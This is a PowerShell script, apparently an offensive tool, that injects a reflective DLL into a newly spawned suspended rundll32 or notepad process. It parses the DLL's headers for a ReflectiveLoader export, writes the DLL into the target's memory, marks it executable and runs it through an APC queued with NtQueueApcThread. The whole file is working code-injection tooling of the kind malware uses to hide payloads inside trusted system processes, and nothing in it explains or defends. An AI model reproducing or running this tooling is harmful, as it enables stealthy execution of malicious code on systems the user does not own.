<#
.SYNOPSIS
    Injects a reflective DLL into a newly created suspended process using APC injection.
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$DllPath,
    [string]$TargetProcess = "rundll32"
)

# Generate a unique type name
$typeName = "WinAPI_" + [System.Guid]::NewGuid().ToString("N")
$typeDefinition = @"
using System;
using System.Runtime.InteropServices;
public static class $typeName {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int NtQueueApcThread(IntPtr hThread, IntPtr pApcRoutine,
        IntPtr pArg1, IntPtr pArg2, IntPtr pArg3);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb; public string lpReserved; public string lpDesktop;
        public string lpTitle; public uint dwX; public uint dwY;
        public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
        public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags;
        public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
    }

    public const uint CREATE_SUSPENDED = 0x00000004;
    public const uint MEM_COMMIT = 0x1000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READ = 0x20;
}
"@

# Add the type
Add-Type -TypeDefinition $typeDefinition

# Resolve the type using PowerShell's type literal syntax
$WinAPIType = [Type]"$typeName"
if (-not $WinAPIType) {
    throw "Failed to resolve type '$typeName'"
}

# Helper: Get correct system directory
function Get-SystemDirectory {
    if (-not [Environment]::Is64BitOperatingSystem) {
        return [Environment]::SystemDirectory
    }
    if ([Environment]::Is64BitProcess) {
        return "$env:SystemRoot\System32"
    } else {
        $sysNative = "$env:SystemRoot\SysNative"
        if (Test-Path $sysNative) {
            return $sysNative
        }
        return "$env:SystemRoot\System32"
    }
}

# Read DLL bytes
$dllBytes = [System.IO.File]::ReadAllBytes($DllPath)

# ================== PE Parsing ==================
function Get-ReflectiveLoaderRVA {
    param([byte[]]$dll)

    $dosMagic = [System.BitConverter]::ToUInt16($dll, 0)
    if ($dosMagic -ne 0x5A4D) { throw "Invalid DOS header" }
    $e_lfanew = [System.BitConverter]::ToInt32($dll, 0x3C)
    $ntHeaders = $e_lfanew
    $peMagic = [System.BitConverter]::ToUInt16($dll, $ntHeaders + 0x18)
    $is64 = ($peMagic -eq 0x20b)

    if ($is64) {
        $exportDirRva = [System.BitConverter]::ToInt32($dll, $ntHeaders + 0x88)
    } else {
        $exportDirRva = [System.BitConverter]::ToInt32($dll, $ntHeaders + 0x78)
    }
    if ($exportDirRva -eq 0) { throw "No export directory" }

    $sections = @()
    if ($is64) {
        $sectionHeaderOffset = $ntHeaders + 0x108
    } else {
        $sectionHeaderOffset = $ntHeaders + 0xF8
    }
    $numSections = [System.BitConverter]::ToUInt16($dll, $ntHeaders + 0x06)
    for ($i = 0; $i -lt $numSections; $i++) {
        $base = $sectionHeaderOffset + $i * 40
        $sec = @{
            VirtualAddress = [System.BitConverter]::ToUInt32($dll, $base + 12)
            VirtualSize   = [System.BitConverter]::ToUInt32($dll, $base + 8)
            PointerToRawData = [System.BitConverter]::ToUInt32($dll, $base + 20)
            SizeOfRawData = [System.BitConverter]::ToUInt32($dll, $base + 16)
        }
        $sections += $sec
    }

    $rvaToOffset = {
        param($rva)
        foreach ($sec in $sections) {
            if ($rva -ge $sec.VirtualAddress -and $rva -lt ($sec.VirtualAddress + $sec.VirtualSize)) {
                return $sec.PointerToRawData + ($rva - $sec.VirtualAddress)
            }
        }
        return $null
    }

    $exportRaw = & $rvaToOffset $exportDirRva
    if ($exportRaw -eq $null) { throw "Cannot map export directory" }

    $numNames = [System.BitConverter]::ToUInt32($dll, $exportRaw + 0x18)
    $addressOfNames = [System.BitConverter]::ToUInt32($dll, $exportRaw + 0x20)
    $addressOfNameOrdinals = [System.BitConverter]::ToUInt32($dll, $exportRaw + 0x24)
    $addressOfFunctions = [System.BitConverter]::ToUInt32($dll, $exportRaw + 0x1C)

    $namesRaw = & $rvaToOffset $addressOfNames
    $ordinalsRaw = & $rvaToOffset $addressOfNameOrdinals
    $funcsRaw = & $rvaToOffset $addressOfFunctions

    for ($i = 0; $i -lt $numNames; $i++) {
        $nameRva = [System.BitConverter]::ToUInt32($dll, $namesRaw + $i * 4)
        $nameOffset = & $rvaToOffset $nameRva
        if ($nameOffset -eq $null) { continue }
        $funcName = ""
        $j = 0
        while ($dll[$nameOffset + $j] -ne 0 -and $j -lt 255) {
            $funcName += [char]$dll[$nameOffset + $j]
            $j++
        }
        if ($funcName -eq "ReflectiveLoader") {
            $ordinal = [System.BitConverter]::ToUInt16($dll, $ordinalsRaw + $i * 2)
            $funcRva = [System.BitConverter]::ToUInt32($dll, $funcsRaw + $ordinal * 4)
            return $funcRva
        }
    }
    throw "ReflectiveLoader export not found"
}

Write-Host "[+] Parsing DLL for ReflectiveLoader..."
$loaderRVA = Get-ReflectiveLoaderRVA -dll $dllBytes
Write-Host "[+] ReflectiveLoader RVA: 0x$($loaderRVA.ToString('X'))"

# ================== Create suspended target process ==================
$sysDir = Get-SystemDirectory
$targetExe = "$TargetProcess.exe"
$targetPath = Join-Path $sysDir $targetExe

if (-not (Test-Path $targetPath)) {
    Write-Warning "$targetPath not found. Using notepad.exe"
    $targetPath = Join-Path $sysDir "notepad.exe"
    if (-not (Test-Path $targetPath)) {
        throw "No valid target executable found in $sysDir"
    }
}
Write-Host "[+] Target executable: $targetPath"

$si = New-Object -TypeName "$typeName+STARTUPINFO"
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object -TypeName "$typeName+PROCESS_INFORMATION"

Write-Host "[+] Creating suspended process..."
$success = $WinAPIType::CreateProcess($targetPath, $null, [IntPtr]::Zero, [IntPtr]::Zero,
    $false, $WinAPIType::CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
if (-not $success) {
    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "CreateProcess failed with error: $err"
}
Write-Host "[+] Process created with PID: $($pi.dwProcessId)"

# ================== Allocate and write DLL ==================
$dllSize = $dllBytes.Length
$remoteBase = $WinAPIType::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, $dllSize,
    $WinAPIType::MEM_COMMIT, $WinAPIType::PAGE_READWRITE)
if ($remoteBase -eq [IntPtr]::Zero) {
    throw "VirtualAllocEx failed"
}
$bytesWritten = 0
$WinAPIType::WriteProcessMemory($pi.hProcess, $remoteBase, $dllBytes, $dllSize, [ref]$bytesWritten)
Write-Host "[+] DLL written to remote memory at 0x$($remoteBase.ToString('X'))"

# ================== Change protection to RX ==================
$oldProtect = 0
$WinAPIType::VirtualProtectEx($pi.hProcess, $remoteBase, $dllSize,
    $WinAPIType::PAGE_EXECUTE_READ, [ref]$oldProtect) | Out-Null

# ================== APC injection ==================
$loaderAddr = [IntPtr]::Add($remoteBase, $loaderRVA)
Write-Host "[+] Queueing APC at $($loaderAddr.ToString('X')) on thread 0x$($pi.hThread.ToString('X'))"
$status = $WinAPIType::NtQueueApcThread($pi.hThread, $loaderAddr, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
if ($status -ne 0) {
    Write-Warning "NtQueueApcThread returned status: $status (non-zero may still work)"
}

# ================== Resume thread ==================
$WinAPIType::ResumeThread($pi.hThread) | Out-Null
Write-Host "[+] Thread resumed. DLL should now execute inside PID $($pi.dwProcessId)"
Write-Host "[+] Done."